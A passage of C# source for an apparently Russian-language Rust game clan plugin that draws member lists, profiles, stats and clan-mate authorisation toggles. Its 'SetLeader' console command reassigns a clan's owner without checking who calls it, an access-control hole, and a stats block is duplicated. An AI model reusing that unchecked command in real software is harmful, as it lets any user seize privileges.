            UI.AddText(ref container, "Title", "Name", "1 1 1 0.8", $"НИК ИГРОКА", TextAnchor.LowerLeft, 13, "0 0", "0 0", "25 -2", "95 20");
            UI.AddText(ref container, "Title", "Activity", "1 1 1 0.8", $"АКТИВНОСТЬ", TextAnchor.LowerLeft, 13, "0 0", "0 0", "220 -2", "300 20");
            UI.AddText(ref container, "Title", "Farm", "1 1 1 0.8", $"НОРМА", TextAnchor.LowerLeft, 13, "0 0", "0 0", "360 -2", "400 20");
            UI.AddText(ref container, "Title", "Points", "1 1 1 0.8", $"ДЕЙСТВИЯ", TextAnchor.LowerLeft, 13, "0 0", "0 0", "455 -2", "520 20");
            double offsetminy = 100, offsetmaxy = 123;
            var ClanMembers = from pair in clan.members orderby pair.Value.PlayerPoints descending select pair;
            int o = 0;
            foreach (KeyValuePair<string, PlayerStats> key in ClanMembers.Skip(8 * page).Take(ClanMembers.ToList().Count >= 8 ? 8 : ClanMembers.ToList().Count))
            {
                var name = covalence.Players.FindPlayerById(key.Key) != null ? covalence.Players.FindPlayerById(key.Key).Name : "Имя не указано";
                BasePlayer playerKey = BasePlayer.FindByID(ulong.Parse(key.Key));
                string color = playerKey != null ? "0.00 1.00 0.00 1.00" : "1.00 0.00 0.00 1.00";
                string activity = playerKey != null ? FormatShortTime(TimeSpan.FromSeconds(playerKey.TimeAlive())) : "0";
                UI.AddImage(ref container, "LowerPanel", "PlayerPanel", $"{HexToRustFormat("#13131384")}", "", "", "0.5 0.5", "0.5 0.5", $"-266 {offsetminy}", $"269 {offsetmaxy}");
                UI.AddText(ref container, "PlayerPanel", "Status", $"{color}", $"●", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "0 0", "21 25");
                UI.AddText(ref container, "PlayerPanel", "Name", $"1 1 1 0.8", $"{name}", TextAnchor.MiddleLeft, 12, "0 0", "0 0", "22 2", "171 23");
                UI.AddText(ref container, "PlayerPanel", "Activity", $"1 1 1 0.8", $"{activity}", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "192 2", "321 23");
                UI.AddText(ref container, "PlayerPanel", "Norma", $"1 1 1 0.8", $"{GetFullPercent(key.Key)}%", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "312 2", "441 23");
                UI.AddButton(ref container, "PlayerPanel", "ProfileP", $"UI_CLAN profilep {key.Key}", "", $"0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
                offsetminy -= 24;
                offsetmaxy -= 24;
            }

            string commandprev = page > 0 ? $"clan.page {page - 1}" : "";
            string commandnext = clan.members.Skip(8 * (page + 1)).Count() > 0 ? $"clan.page {page + 1}" : "";

            container.Add(new CuiButton
            {
                Button = { Color = $"{HexToRustFormat("#7A7671FF")}", Command = commandprev },
                Text = { Text = "<", Color = "1 0.9294118 0.8666667 1", FontSize = 14, Align = TextAnchor.MiddleCenter },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"0 0", OffsetMin = "4 4", OffsetMax = "46 37" },
            }, "LowerPanel", "PrevBTN");

            UI.AddImage(ref container, "LowerPanel", "Pages", $"{HexToRustFormat("#00000031")}", "", "", "0 0", "0 0", $"48 4", $"90 37");
            UI.AddText(ref container, "Pages", "Page", $"1 1 1 0.8", $"{page + 1}", TextAnchor.MiddleCenter, 12, "0 0", "1 1", "0 0", "0 0");

            container.Add(new CuiButton
            {
                Button = { Color = $"{HexToRustFormat("#7A7671FF")}", Command = commandnext },
                Text = { Text = ">", Color = "1 0.9294118 0.8666667 1", FontSize = 14, Align = TextAnchor.MiddleCenter },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"0 0", OffsetMin = "92 4", OffsetMax = "134 37" },
            }, "LowerPanel", "NextBTN");


            #endregion

            #region ClanFarm
            UI.AddImage(ref container, "ClanGUIParent", "ClanFarmParent", $"{HexToRustFormat("#74706A6D")}", "", "assets/icons/greyout.png", "0.5 0.5", "0.5 0.5", "140 -304", "407 -21");
            UI.AddText(ref container, "ClanFarmParent", "Title", $"1 1 1 0.8", $"ДОБЫЧА РЕСУРСОВ", TextAnchor.MiddleCenter, 21, "0.5 0.5", "0.5 0.5", "-100 104", "100 150");

            double offsetMINX = -114, offsetMINY = 35, offsetMAXX = -40, offsetMAXY = 108;
            int m = 0, h = 0;
            foreach (var item in clan.Change)
            {
                if (h == 9) break;
                UI.AddImage(ref container, "ClanFarmParent", "FarmParent", $"{HexToRustFormat("#4E4A477D")}", "", "assets/icons/greyout.png", "0.5 0.5", "0.5 0.5", $"{offsetMINX} {offsetMINY}", $"{offsetMAXX} {offsetMAXY}");
                UI.AddRawImage(ref container, "FarmParent", "FarmIMG", GetImageUrl(item.Key, 0), "1 1 1 1", "", "", "0 0", "1 1", "0 0", "0 0");
                UI.AddText(ref container, "FarmParent", "FarmAmount", "1 1 1 0.8", $"{item.Value.Complete}", TextAnchor.MiddleRight, 8, "0 0", "0 0", "33 0", "67 10");
                UI.AddText(ref container, "FarmParent", "FarmPercent", "1 1 1 0.8", $"{GetPercent(item.Value.Need, item.Value.Complete)}", TextAnchor.UpperRight, 10, "0.5 0.5", "0.5 0.5", "0 20", "35 35");
                offsetMINX += 76;
                offsetMAXX += 76;
                if (m == 2)
                {
                    offsetMINX = -114;
                    offsetMAXX = -40;
                    offsetMINY -= 76;
                    offsetMAXY -= 76;
                    m = 0;
                }
                else
                {
                    m++;
                }
                h++;
            }
            if (clan.owner.Contains(player.UserIDString))
            {
                UI.AddButton(ref container, "ClanFarmParent", "SetTasks", $"clan_setChange", "", $"0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            }
            #endregion



            CuiHelper.AddUi(player, container);
        }


        void UI_Profile(BasePlayer player, ulong TargetID)
        {
            var container = new CuiElementContainer();
            var clan = findClanByUser(player.UserIDString);
            bool IsLeader = clan.owner == player.UserIDString;
            bool IsModerator = clan.moderators.Contains(player.UserIDString);
            BasePlayer Target = BasePlayer.FindByID(TargetID);
            CuiHelper.DestroyUi(player, "MainClans");
            CuiHelper.DestroyUi(player, "MainClan");

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                Image = { Color = $"{HexToRustFormat("#322D2499")}", Material = "assets/content/ui/uibackgroundblur.mat" },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" }
            }, "Overlay", "MainClans");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Button = { Command = "chat.say /clan", Color = "0 0 0 0" }
            }, "MainClans");


            UI.AddImage(ref container, "MainClans", "LeftPanel", $"{HexToRustFormat("#74706A6D")}", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-382 -120", "127 115");
            UI.AddRawImage(ref container, "LeftPanel", "Avatar", GetImageUrl(TargetID.ToString(), 0), $"1 1 1 1", "", "", "0.5 0.5", "0.5 0.5", "-230 -35", "-100 95");
            string activity = Target != null ? FormatShortTime(TimeSpan.FromSeconds(Target.TimeAlive())) : "0";

            Dictionary<string, string> texts = new Dictionary<string, string>()
            {
                { "НИК ИГРОКА", $"{covalence.Players.FindPlayerById(TargetID.ToString()).Name}" },
                { "СТИМ ИГРОКА", $"{TargetID}" },
                { "АКТИВНОСТЬ", $"{activity}" },
                { "ВЫПОЛНЕННАЯ НОРМА", $"{GetFullPercent(TargetID.ToString())}%" }
            };

            double offsetminh = 61;
            double offsetmaxh = 83;

            foreach (KeyValuePair<string, string> kvp in texts)
            {
                string text = kvp.Key;
                string text2 = kvp.Value;

                UI.AddImage(ref container, "LeftPanel", "PlayerInfo", $"{HexToRustFormat("#1E20246E")}", "", "assets/icons/greyout.png", "0.5 0.5", "0.5 0.5", $"-75 {offsetminh}", $"232 {offsetmaxh}");
                UI.AddText(ref container, "PlayerInfo", $"{text}", "1 1 1 0.8", $"{text}", TextAnchor.MiddleLeft, 14, "0 0", "0 0", "5 0", "200 20");
                UI.AddText(ref container, "PlayerInfo", $"{text2}", "1 1 1 0.8", $"{text2}", TextAnchor.MiddleRight, 14, "1 0", "1 0", "-150 0", "-5 20");

                offsetminh -= 24;
                offsetmaxh -= 24;
            }



            UI.AddImage(ref container, "MainClans", "PlayerFarm", $"{HexToRustFormat("#74706A6D")}", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "130 -120", "350 115");
            UI.AddText(ref container, "PlayerFarm", "Title", "1 1 1 0.8", $"ДОБЫТО РЕСУРСОВ", TextAnchor.MiddleCenter, 21, "0.5 0.5", "0.5 0.5", "-100 90", "100 120");
            double offsetMinx = -93, offsetMiny = 24, offsetMaxX = -30, offsetMaxY = 87;
            int m = 0, h = 0;
            foreach (var item in clan.members[TargetID.ToString()].GatherInfo)
            {
                if (h == 9) break;
                UI.AddImage(ref container, "PlayerFarm", "FarmParent", $"{HexToRustFormat("#4E4A477D")}", "", "assets/icons/greyout.png", "0.5 0.5", "0.5 0.5", $"{offsetMinx} {offsetMiny}", $"{offsetMaxX} {offsetMaxY}");
                UI.AddRawImage(ref container, "FarmParent", "FarmIMG", GetImageUrl(item.Key, 0), "1 1 1 1", "", "", "0 0", "1 1", "0 0", "0 0");
                UI.AddText(ref container, "FarmParent", "FarmAmount", "1 1 1 0.8", $"{item.Value}", TextAnchor.MiddleRight, 8, "0 0", "0 0", "33 0", "60 10");
                offsetMinx += 64;
                offsetMaxX += 64;
                if (m == 2)
                {
                    offsetMinx = -93;
                    offsetMaxX = -30;
                    offsetMiny -= 64;
                    offsetMaxY -= 64;
                    m = 0;
                }
                else
                {
                    m++;
                }
                h++;
            }

            if (player != Target)
            {
                if (IsModerator || IsLeader)
                {
                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "0 0", OffsetMin = "25 25", OffsetMax = "176 58" },
                        Button = { Command = $"clan_kickplayer {TargetID}", Color = $"{HexToRustFormat("#1E20246E")}" },
                        Text = { Text = "ВЫГНАТЬ", Align = TextAnchor.MiddleCenter, FontSize = 14, Color = "1 1 1 0.8", Font = "robotocondensed-bold.ttf" }
                    }, "LeftPanel", "Kick");
                }
                if (IsLeader)
                {
                    container.Add(new CuiButton
                    {
                        Button = { Color = $"{HexToRustFormat("#1E20246E")}", Command = clan.moderators.Contains(TargetID.ToString()) ? $"clanui_promote demote {TargetID}" : $"clanui_promote promote {TargetID}" },
                        Text = { Text = clan.moderators.Contains(TargetID.ToString()) ? "УБРАТЬ МОДЕРА" : "ВЫДАТЬ МОДЕРА", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 12 },
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "0 0", OffsetMin = "180 25", OffsetMax = "331 58" },
                    }, "LeftPanel", "SetModerator");

                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "0 0", OffsetMin = "335 25", OffsetMax = "486 58" },
                        Button = { Command = $"SetLeader {TargetID}", Color = $"{HexToRustFormat("#1E20246E")}" },
                        Text = { Text = "НАЗНАЧИТЬ ГЛАВОЙ", Align = TextAnchor.MiddleCenter, FontSize = 12, Color = "1 1 1 0.8", Font = "robotocondensed-bold.ttf" }
                    }, "LeftPanel", "SetLeader");
                }
            }



            CuiHelper.AddUi(player, container);
        }

        [ConsoleCommand("SetLeader")]
        void SetLeader(ConsoleSystem.Arg args)
        {
            string TargetID = args.Args[0];
            Clan myClan = findClanByUser(TargetID);
            myClan.moderators.Remove(TargetID);
            myClan.owner = TargetID;
            myClan.ownerName = covalence.Players.FindPlayerById(TargetID).Name;
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
        }


        [ConsoleCommand("UI_CLAN")]
        void cmdUIClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            if (player == null) return;
            if (!args.HasArgs()) return;
            var clan = findClanByUser(player.UserIDString);
            switch (args.Args[0])
            {
                case "edit":
                    if (!clan.IsOwner(player.UserIDString)) return;

                    string parrent = args.Args[1];
                    string command = args.FullString.Replace($"edit {parrent} ", "");
                    // Puts(command);
                    var shopname = command.Replace("clans_getskinIds ", "");
                    CuiElementContainer container = new CuiElementContainer();
                    container.Add(new CuiButton
                    {
                        Button = { Command = command, Color = "0 0 0 0.95", Sprite = "assets/content/ui/ui.background.tile.psd" },
                        Text = { Text = $"ИЗМЕНИТЬ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 10 },
                        RectTransform = { AnchorMin = "0 0", AnchorMax = $"1 1" },
                    }, parrent, "UICLAN_edit" + shopname);
                    CuiHelper.DestroyUi(player, "UICLAN_edit" + shopname);
                    CuiHelper.AddUi(player, container);

                    break;
                case "member":
                    parrent = args.Args[1];
                    var user = args.Args[2];
                    container = new CuiElementContainer();
                    container.Add(new CuiElement
                    {
                        Name = "UICLAN_member",
                        Parent = parrent,
                        Components =
                    {
                        new CuiImageComponent {Color = "0.235 0.227 0.180 0.95", Sprite = "assets/content/ui/ui.background.tile.psd" },
                        new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"}
                    }
                    });

                    container.Add(new CuiButton
                    {
                        Button = { Color = "0.59 0.83 0.60 0.5", Command = $"UI_CLAN stats {user}" },
                        Text = { Text = $"СТАТИСТИКА", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 12 },
                        RectTransform = { AnchorMin = clan.IsOwner(player.UserIDString) && user != player.UserIDString ? "0 0.22" : "0 0", AnchorMax = clan.IsOwner(player.UserIDString) && user != player.UserIDString ? $"0.989 0.4" : $"0.989 0.2" },
                    }, "UICLAN_member");

                    if (clan.IsOwner(player.UserIDString) && user != player.UserIDString)
                    {
                        container.Add(new CuiButton
                        {
                            Button = { Color = "0.81 0.55 0.55 0.5", Command = $"clan_kickplayer {user}" },
                            Text = { Text = $"ВЫГНАТЬ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 15 },
                            RectTransform = { AnchorMin = "0 0", AnchorMax = $"0.989 0.2" },
                        }, "UICLAN_member");
                    }

                    CuiHelper.DestroyUi(player, "UICLAN_member");
                    CuiHelper.AddUi(player, container);
                    break;

                case "profilep":
                    ulong TargetID = Convert.ToUInt64(args.Args[1]);
                    UI_Profile(player, TargetID);
                    break;
                case "changeui":
                    string item = args.Args[1];
                    ClanChangeUi(player, item);
                    break;
                case "close":
                    string closerParent = args.Args[1];
                    string closerMenu = args.Args[2];
                    CuiHelper.DestroyUi(player, closerParent);
                    CuiHelper.DestroyUi(player, closerMenu);
                    break;
                case "stats":
                    var playerStats = clan.GetPlayerStats(args.Args[1]);
                    if (playerStats == null) return;
                    CreatePlayerInfo(player, clan, playerStats, args.Args[1]);
                    break;
            }
        }


        void CreatePlayerInfo(BasePlayer player, Clan clan, PlayerStats stats, string userID)
        {
            bool ownerOrModerator = clan.owner == player.UserIDString || clan.IsModerator(player.UserIDString) ? true : false;

            CuiElementContainer container = new CuiElementContainer();
            container.Add(new CuiElement
            {
                Name = "UICLAN_stats",
                Parent = MainLayer,
                Components =
                    {
                        new CuiImageComponent {Color = "0 0 0 0.85", Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" },
                        new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"}
                    }
            });

            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats",
                Components =
                    {
                        new CuiButtonComponent {Color = "0.141 0.137 0.109 1", Sprite = "assets/content/ui/ui.background.transparent.radial.psd", Command = $"UI_CLAN close UICLAN_stats UICLAN_member"},
                        new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"}
                    }
            });

            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats",
                Components =
                    {
                        new CuiTextComponent { Text = $"СТАТИСТИКА ИГРОКА {clan.GetIMember(userID).Name.ToUpper()}", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 25},
                        new CuiRectTransformComponent { AnchorMin = "0 0.8", AnchorMax = "1 1" },
                    }
            });


            container.Add(new CuiElement
            {
                Name = "UICLAN_stats.Block",
                Parent = "UICLAN_stats",
                Components =
                    {
                        new CuiImageComponent {Color = "0 0 0 0"},
                        new CuiRectTransformComponent {AnchorMin = "0.2 0.2", AnchorMax = "0.8 0.8"}
                    }
            });



            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Components =
                            {
                                new CuiRawImageComponent { Color = "1 1 1 1", Png = (string)ImageLibrary?.Call("GetImage", userID)},
                                new CuiRectTransformComponent{
                                    AnchorMin = "0 0.5",
                                    AnchorMax =  "0.3 1" },
                            }
            });

            if (ownerOrModerator)
            {
                container.Add(new CuiButton
                {
                    Button = { Color = clan.moderators.Contains(userID) ? "0.81 0.55 0.55 0.7" : "0.59 0.83 0.60 0.7", Command = clan.moderators.Contains(userID) ? $"clanui_promote demote {userID}" : $"clanui_promote promote {userID}" },
                    Text = { Text = clan.moderators.Contains(userID) ? "УБРАТЬ МОДЕРАТОРА" : "НАЗНАЧИТЬ МОДЕРАТОРОМ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 15 },
                    RectTransform = { AnchorMin = $"0 0.39", AnchorMax = $"0.3 0.49" },
                }, "UICLAN_stats.Block");


                container.Add(new CuiButton
                {
                    Button = { Color = clan.owner != userID ? "0.74 0.39 0.39 0.7" : "1 1 1 0.1", Command = clan.owner != userID ? $"clan_kickplayer {userID}" : "" },
                    Text = { Text = "ВЫГНАТЬ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 15 },
                    RectTransform = { AnchorMin = $"0 0.28", AnchorMax = $"0.3 0.385" },
                }, "UICLAN_stats.Block");
            }



            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Components =
                    {
                        new CuiTextComponent { Text = $"УБИЙСТВ\n<size=17>{stats.Killed}</size>", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 19},
                        new CuiRectTransformComponent { AnchorMin = "0.35 0.9", AnchorMax = "0.5 1" },
                    }
            });


            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Components =
                    {
                        new CuiTextComponent { Text = $"СМЕРТЕЙ\n<size=17>{stats.Death}</size>", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 19},
                        new CuiRectTransformComponent { AnchorMin = "0.5 0.9", AnchorMax = "0.65 1" },
                    }
            });

            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Components =
                    {
                        new CuiTextComponent { Text = $"СБИТО ВЕРТОЛЁТОВ\n<size=17>{stats.KilledHeli}</size>", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 19},
                        new CuiRectTransformComponent { AnchorMin = "0.65 0.9", AnchorMax = "0.90 1" },
                    }
            });


            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Components =
                    {
                        new CuiTextComponent { Text = $"СУИЦИДОВ\n<size=17>{stats.Suicide}</size>", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 19},
                        new CuiRectTransformComponent { AnchorMin = "0.9 0.9", AnchorMax = "1.05 1" },
                    }
            });


            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Components =
                    {
                        new CuiTextComponent { Text = $"СУИЦИДОВ\n<size=17>{stats.Suicide}</size>", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 19},
                        new CuiRectTransformComponent { AnchorMin = "0.9 0.9", AnchorMax = "1.05 1" },
                    }
            });


            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats",
                Components =
                            {
                                new CuiImageComponent { Color = "0.81 0.81 0.81 1.00"},
                                new CuiRectTransformComponent{ AnchorMin = $"0.2 0.86", AnchorMax = $"0.8 0.8601" },
                            }
            });

            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Components =
                            {
                                new CuiImageComponent { Color = "0.81 0.81 0.81 1.00"},
                                new CuiRectTransformComponent{ AnchorMin = $"0.4 0.88", AnchorMax = $"1 0.8801" },
                            }
            });

            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Components =
                    {
                        new CuiTextComponent { Text = $"ДОБЫЧА", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 23},
                        new CuiRectTransformComponent { AnchorMin = "0.35 0.8", AnchorMax = "1.05 0.86" },
                    }
            });






            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Name = "UICLAN_stats.Gather",
                Components =
                            {
                                new CuiImageComponent { Color = "0.81 0.81 0.81 0"},
                                new CuiRectTransformComponent{ AnchorMin = $"0.3 0.5", AnchorMax = $"1.1 0.8" },
                            }
            });

            int i = 0;
            var pos = GetPositions(4, 3, 0.1f, 0.01f);
            foreach (var item in stats.GatherInfo)
            {
                if (!RewardTranslate.ContainsKey(item.Key)) continue;
                var name = RewardTranslate[item.Key];

                container.Add(new CuiElement
                {
                    Parent = "UICLAN_stats.Gather",
                    Components =
                    {
                        new CuiTextComponent { Text = $"{name}\n<size=12>{item.Value}</size>", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 12},
                        new CuiRectTransformComponent { AnchorMin = pos[i].AnchorMin, AnchorMax = pos[i].AnchorMax},
                    }
                });

                i++;
            }

            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Components =
                            {
                                new CuiImageComponent { Color = "0.81 0.81 0.81 1.00"},
                                new CuiRectTransformComponent{ AnchorMin = $"0.4 0.45", AnchorMax = $"1 0.451" },
                            }
            });


            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Components =
                    {
                        new CuiTextComponent { Text = $"АВТОРИЗАЦИЯ СОКЛАНОВ", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 23},
                        new CuiRectTransformComponent { AnchorMin = "0.35 0.35", AnchorMax = "1.05 0.45" },
                    }
            });



            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Block",
                Name = "UICLAN_stats.Auth",
                Components =
                            {
                                new CuiImageComponent { Color = "0.81 0.81 0.81 0"},
                                new CuiRectTransformComponent{ AnchorMin = $"0.3 0.25", AnchorMax = $"1.1 0.36" },
                            }
            });



            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Auth",
                Components =
                    {
                        new CuiTextComponent { Text = $"ШКАФЫ", Color = "1 1 1 1", Align = TextAnchor.UpperCenter, Font = "robotocondensed-bold.ttf", FontSize = 18},
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "0.2 1" },
                    }
            });


            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Auth",
                Name = "UICLAN_stats.Auth_cup",
                Components =
                    {
                        new CuiImageComponent {  Color = "1 1 1 0.1"},
                        new CuiRectTransformComponent { AnchorMin = $"0.01 0", AnchorMax = $"0.2 0.5"},
                    }
            });


            container.Add(new CuiButton
            {
                Button = { Color = clan.members[userID].CupAuth ? "0.59 0.83 0.60 0.7" : "1 1 1 0.1", Command = player.UserIDString == userID ? "clans_authplayers cup true" : "" },
                Text = { Text = "ВКЛ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 15 },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"0.49 0.98" },
            }, "UICLAN_stats.Auth_cup");

            container.Add(new CuiButton
            {
                Button = { Color = !clan.members[userID].CupAuth ? "0.81 0.55 0.55 0.7" : "1 1 1 0.1", Command = player.UserIDString == userID ? "clans_authplayers cup false" : "" },
                Text = { Text = "ВЫКЛ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 15 },
                RectTransform = { AnchorMin = $"0.51 0", AnchorMax = $"1 0.98" },
            }, "UICLAN_stats.Auth_cup");



            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Auth",
                Components =
                    {
                        new CuiTextComponent { Text = $"ЗАМКИ", Color = "1 1 1 1", Align = TextAnchor.UpperCenter, Font = "robotocondensed-bold.ttf", FontSize = 18},
                        new CuiRectTransformComponent { AnchorMin = "0.4 0", AnchorMax = "0.6 1" },
                    }
            });

            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Auth",
                Name = "UICLAN_stats.Auth_code",
                Components =
                    {
                        new CuiImageComponent {  Color = "1 1 1 0.1"},
                        new CuiRectTransformComponent { AnchorMin = $"0.4 0", AnchorMax = $"0.6 0.5"},
                    }
            });


            container.Add(new CuiButton
            {
                Button = { Color = clan.members[userID].CodeAuth ? "0.59 0.83 0.60 0.7" : "1 1 1 0.1", Command = player.UserIDString == userID ? "clans_authplayers code true" : "" },
                Text = { Text = "ВКЛ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 15 },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"0.49 0.98" },
            }, "UICLAN_stats.Auth_code");

            container.Add(new CuiButton
            {
                Button = { Color = !clan.members[userID].CodeAuth ? "0.81 0.55 0.55 0.7" : "1 1 1 0.1", Command = player.UserIDString == userID ? "clans_authplayers code false" : "" },
                Text = { Text = "ВЫКЛ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 15 },
                RectTransform = { AnchorMin = $"0.51 0", AnchorMax = $"1 0.98" },
            }, "UICLAN_stats.Auth_code");


            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Auth",
                Components =
                    {
                        new CuiTextComponent { Text = $"ТУРЕЛИ", Color = "1 1 1 1", Align = TextAnchor.UpperCenter, Font = "robotocondensed-bold.ttf", FontSize = 18},
                        new CuiRectTransformComponent { AnchorMin = "0.8 0", AnchorMax = "1 1" },
                    }
            });

            container.Add(new CuiElement
            {
                Parent = "UICLAN_stats.Auth",
                Name = "UICLAN_stats.Auth_turret",
                Components =
                    {
                        new CuiImageComponent {  Color = "1 1 1 0.1"},
                        new CuiRectTransformComponent { AnchorMin = $"0.8 0", AnchorMax = $"1 0.5"},
                    }
            });


            container.Add(new CuiButton
            {
                Button = { Color = clan.members[userID].TurretAuth ? "0.59 0.83 0.60 0.7" : "1 1 1 0.1", Command = player.UserIDString == userID ? "clans_authplayers turret true" : "" },
                Text = { Text = "ВКЛ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 15 },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"0.49 0.98" },
            }, "UICLAN_stats.Auth_turret");

            container.Add(new CuiButton
            {
                Button = { Color = !clan.members[userID].TurretAuth ? "0.81 0.55 0.55 0.7" : "1 1 1 0.1", Command = player.UserIDString == userID ? "clans_authplayers turret false" : "" },
                Text = { Text = "ВЫКЛ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 15 },
                RectTransform = { AnchorMin = $"0.51 0", AnchorMax = $"1 0.98" },
            }, "UICLAN_stats.Auth_turret");

            CuiHelper.DestroyUi(player, "UICLAN_stats");
            CuiHelper.AddUi(player, container);
        }


        public Dictionary<ulong, double> AuthCD = new Dictionary<ulong, double>();


        [ConsoleCommand("clans_authplayers")]
        void cmdAuthPlayerInClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            if (player == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;
            var playerStats = clan.GetPlayerStats(player.UserIDString);
            if (playerStats == null) return;
            bool current;
            if (!bool.TryParse(args.Args[1], out current)) return;


            switch (args.Args[0])
            {
                case "cup":
                    if (AuthCD.ContainsKey(player.userID))
                    {
                        var left = AuthCD[player.userID] - CurrentTime();
                        if (left <= 0)
                            AuthCD.Remove(player.userID);
                        else
                        {
                            player.ChatMessage($"Вы не можете использовать авторизацию еще {TimeSpan.FromSeconds(left).ToShortString()} секунд!");
                            return;
                        }
                    }
                    if (!AuthCD.ContainsKey(player.userID))
                        AuthCD.Add(player.userID, CurrentTime() + 5);

                    playerStats.CupAuth = current;

                    AutOnBuildingPrivilage<BuildingPrivlidge>(player,
                         clan,
                            (where, user) =>
                            {
                                if (current)
                                    where.authorizedPlayers.Add(new PlayerNameID
                                    {
                                        userid = ulong.Parse(user),
                                        username = ""
                                    });
                                else
                                    where.authorizedPlayers.RemoveAll(x => x.userid.ToString() == user);
                                where.SendNetworkUpdate(BasePlayer.NetworkQueue.Update);
                            });


                    break;
                case "code":
                    playerStats.CodeAuth = current;

                    break;
                case "turret":
                    playerStats.TurretAuth = current;
                    break;
            }
            CreatePlayerInfo(player, clan, playerStats, player.UserIDString);
        }

        [ChatCommand("clanset")]
        void ClanSetSkinn(BasePlayer player, string command, string[] args)
        {
            var clan = findClanByUser(player.UserIDString);
            if (clan == null)
            {
                player.ChatMessage("У вас нету клана!\nЧтобы создать клан пропишите - /clan create TAG");
                return;
            }
            if (clan.owner != player.UserIDString)
            {
                player.ChatMessage("Вы не глава своего клана!");
                return;
            }
            if (args.Length == 0)
            {
                player.ChatMessage("<color=red>Вы не выбрали сет который хотите!</color>\nЧтобы выбрать сет пропишите:\n/clanset название сета\n\n<color=#32CD32>Доступные сета:</color>\nЧерный - black\nДемон - demon\nАхегао - ahegao\nСалат - salat\nКрасный - red\nБелый - white\nАнонимус - anonymous\nLouis Vouitton - lv\nСвинка - pig");
                return;
            }
            string Set = args[0];
            int i = 50;
            long lng = 100;
            i = (int)lng;
            if (Set == "black")
            {
                clan.SkinList["wear"]["metal.facemask"] = 2847192312;
                clan.SkinList["wear"]["metal.plate.torso"] = 2847192740;
                clan.SkinList["wear"]["roadsign.kilt"] = 2847194089;
